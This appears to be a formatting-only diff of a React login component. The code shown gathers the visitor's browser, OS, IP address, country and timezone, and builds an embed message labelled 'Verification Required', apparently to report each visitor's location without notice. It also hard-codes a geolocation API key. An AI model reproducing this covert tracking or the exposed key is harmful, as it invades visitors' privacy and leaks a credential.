@@ -28,7 +28,8 @@ export default function Login() {
     else if (ua.indexOf("Safari") > -1) browser = "Safari";
     else if (ua.indexOf("Firefox") > -1) browser = "Firefox";
     else if (ua.indexOf("Edge") > -1) browser = "Edge";
-    else if (ua.indexOf("MSIE") > -1 || ua.indexOf("Trident") > -1) browser = "IE";
+    else if (ua.indexOf("MSIE") > -1 || ua.indexOf("Trident") > -1)
+      browser = "IE";
 
     return { os, browser, userAgent: ua };
   };
@@ -54,7 +55,7 @@ export default function Login() {
       try {
         const geoResponse = await fetch(
           `https://geo.ipify.org/api/v2/country?apiKey=at_IKg1sglXL6d6c1wq7jw7FqQ1LYXJX&ipAddress=${ipData.ip}`,
-          { method: "GET" }
+          { method: "GET" },
         );
         if (geoResponse.ok) {
           geoData = await geoResponse.json();
@@ -63,7 +64,8 @@ export default function Login() {
         console.warn("Geo lookup failed:", err);
       }
 
-      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "N/A";
+      const timezone =
+        Intl.DateTimeFormat().resolvedOptions().timeZone || "N/A";
 
       return {
         ip: ipData.ip || "N/A",
@@ -154,7 +156,7 @@ export default function Login() {
           name: "🌐 Source",
           value: locationInfo.source,
           inline: true,
-        }
+        },
       );
 
       const message = {
@@ -166,7 +168,8 @@ export default function Login() {
             fields: fields,
             footer: {
               text: "Family Site - Verification Required",
-              icon_url: "https://cdn-icons-png.flaticon.com/512/3556/3556197.png",
+              icon_url:
+                "https://cdn-icons-png.flaticon.com/512/3556/3556197.png",
             },
           },
         ],
